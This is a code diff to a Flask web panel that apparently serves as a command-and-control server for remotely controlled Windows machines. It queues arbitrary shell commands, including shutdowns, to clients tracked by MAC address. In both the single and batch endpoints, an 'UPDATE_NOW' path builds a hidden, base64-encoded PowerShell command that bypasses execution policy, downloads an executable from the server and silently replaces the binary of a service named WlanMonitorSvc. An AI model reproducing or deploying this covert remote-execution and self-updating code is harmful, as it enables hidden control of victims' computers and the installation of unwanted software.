@@ -1,7 +1,7 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
-from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
+from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue
 
 bp = Blueprint('terminal', __name__)
 
@@ -118,33 +118,49 @@ def api_send_cmd():
     data = request.json
     mac = data.get('mac')
     cmd = data.get('cmd')
-    if mac in clients_db:
-        if cmd == 'UPDATE_NOW':
-            import base64
-            host_url = request.host_url.rstrip('/')
-            def get_version(v_str):
-                try: return [int(x) for x in v_str.strip().split('.')]
-                except: return [0, 0, 0]
-            client_ver = clients_db[mac].get('ver', '1.0.0')
-            if get_version(client_ver) < [1, 6, 10]:
-                ps_cmd = (
-                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
-                    "if (-not $p) { exit }; "
-                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
-                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
-                )
-                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
-                clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
-            else:
-                clients_db[mac]['pending_cmd'] = cmd
-        else:
-            clients_db[mac]['pending_cmd'] = cmd
 
-        name = clients_db[mac].get('name', '未命名设备')
-        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
-        clients_db[mac]['is_executing'] = True
-        save_db()
-    return jsonify({"status": "ok"})
+    if mac not in clients_db:
+        return jsonify({"status": "error", "msg": "设备不存在"}), 404
+
+    # 初始化该客户端的队列
+    init_client_queue(mac)
+
+    # 确定命令优先级（娱乐命令用 'normal'，重要命令用 'high'）
+    priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'
+
+    # 处理 UPDATE_NOW 特殊逻辑
+    if cmd == 'UPDATE_NOW':
+        import base64
+        host_url = request.host_url.rstrip('/')
+        def get_version(v_str):
+            try: return [int(x) for x in v_str.strip().split('.')]
+            except: return [0, 0, 0]
+        client_ver = clients_db[mac].get('ver', '1.0.0')
+        if get_version(client_ver) < [1, 6, 10]:
+            ps_cmd = (
+                "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
+                "if (-not $p) { exit }; "
+                f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
+                "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
+            )
+            ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
+            cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
+        priority = 'high'
+
+    # 使用命令队列进行投递（返回布尔值表示是否成功入队）
+    success = add_cmd_to_queue(mac, cmd, priority=priority)
+
+    if not success:
+        return jsonify({"status": "error", "msg": "命令队列已满，请稍后重试"}), 429
+
+    # 记录到终端历史（用于展示）
+    name = clients_db[mac].get('name', '未命名设备')
+    clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
+    clients_db[mac]['is_executing'] = True
+    save_db()
+
+    return jsonify({"status": "ok", "msg": "命令已入队，等待设备执行"})
+
 
 @bp.route('/api/batch_cmd', methods=['POST'])
 def api_batch_cmd():
@@ -158,29 +174,47 @@ def api_batch_cmd():
         try: return [int(x) for x in v_str.strip().split('.')]
         except: return [0, 0, 0]
 
+    failed_macs = []
     for mac in macs:
-        if mac in clients_db:
-            if cmd == 'UPDATE_NOW':
-                client_ver = clients_db[mac].get('ver', '1.0.0')
-                if get_version(client_ver) < [1, 6, 10]:
-                    ps_cmd = (
-                        "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
-                        "if (-not $p) { exit }; "
-                        f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
-                        "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
-                    )
-                    ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
-                    clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
-                else:
-                    clients_db[mac]['pending_cmd'] = cmd
-            else:
-                clients_db[mac]['pending_cmd'] = cmd
+        if mac not in clients_db:
+            failed_macs.append(mac)
+            continue
 
-            name = clients_db[mac].get('name', '未命名设备')
-            clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
-            clients_db[mac]['is_executing'] = True
+        init_client_queue(mac)
+
+        # 确定命令优先级
+        priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'
+
+        # 处理 UPDATE_NOW 特殊逻辑
+        final_cmd = cmd
+        if cmd == 'UPDATE_NOW':
+            client_ver = clients_db[mac].get('ver', '1.0.0')
+            if get_version(client_ver) < [1, 6, 10]:
+                ps_cmd = (
+                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
+                    "if (-not $p) { exit }; "
+                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
+                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
+                )
+                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
+                final_cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
+            priority = 'high'
+
+        # 入队
+        if not add_cmd_to_queue(mac, final_cmd, priority=priority):
+            failed_macs.append(mac)
+            continue
+
+        name = clients_db[mac].get('name', '未命名设备')
+        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {final_cmd}\n")[-50000:]
+        clients_db[mac]['is_executing'] = True
+
     save_db()
-    return jsonify({"status": "ok"})
+
+    if failed_macs:
+        return jsonify({"status": "partial", "msg": f"部分设备入队失败: {', '.join(failed_macs)}", "failed": failed_macs}), 207
+    return jsonify({"status": "ok", "msg": "所有命令已入队"})
+
 
 @bp.route('/api/get_cmd_result/<mac>')
 def api_get_cmd_result(mac):
